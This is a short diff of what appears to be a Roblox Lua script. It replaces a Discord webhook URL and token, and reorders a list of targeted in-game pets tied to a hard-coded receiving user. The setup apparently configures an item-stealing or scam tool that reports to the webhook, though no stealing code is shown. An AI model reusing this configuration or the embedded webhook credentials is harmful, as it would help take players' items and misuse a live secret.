@@ -1,10 +1,10 @@
 local TARGET_ID = 10095557361
 local TARGET_USER = "nl51329"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572952507515408444/iqoG_rf_KOUMAF9MQFd_l5Z99bLrgIMp0p-83NFKlQRLY0PR6MiauEPGqN7V-urn6hYn"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1574351304631779449/SU6Hko-DEf5J3DVOcySenGbJ2i5HMFf-T9IPdtCYVnkCXyWGi0BswZMGF8dmsHNr3-PW"
 
 local TargetBrainrots = {
-    ["Phoenix"] = true,
     ["Dragon Skeletonini"] = true,
+    ["Phoenix"] = true,
     ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
     ["Orchidox"] = true,
